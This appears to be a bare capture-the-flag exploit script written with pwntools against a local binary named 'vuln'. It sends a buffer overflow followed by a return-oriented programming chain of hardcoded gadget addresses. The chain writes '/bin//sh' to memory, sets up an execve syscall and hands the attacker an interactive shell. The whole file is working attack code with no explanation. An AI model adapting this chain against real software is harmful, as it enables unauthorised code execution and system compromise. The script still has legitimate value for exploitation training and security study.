#!/usr/bin/env python

from pwn import *

r = process("./vuln")
r.recvuntil("Can you ROP your way out of this?\n")

payload = (
    "A" * 24 +
    p64(0x00000000004100d3) + # pop rsi ; ret
    p64(0x00000000006b90e0) + # @ .data
    p64(0x00000000004156f4) +# pop rax ; ret
    '/bin//sh' +
    p64(0x000000000047f561) + # mov qword ptr [rsi], rax ; ret
    p64(0x00000000004100d3) + # pop rsi ; ret
    p64(0x00000000006b90e8) + # @ .data + 8
    p64(0x0000000000444c50) + # xor rax, rax ; ret
    p64(0x000000000047f561) + # mov qword ptr [rsi], rax ; ret
    p64(0x0000000000400686) + # pop rdi ; ret
    p64(0x00000000006b90e0) + # @ .data
    p64(0x00000000004100d3) + # pop rsi ; ret
    p64(0x00000000006b90e8) + # @ .data + 8
    p64(0x00000000004499b5) + # pop rdx ; ret
    p64(0x00000000006b90e8) + # @ .data + 8
    p64(0x0000000000444c50) + # xor rax, rax ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x00000000004749c0) + # add rax, 1 ; ret
    p64(0x0000000000449135) # syscall ; ret
)
r.sendline(payload)
r.interactive()
r.close()
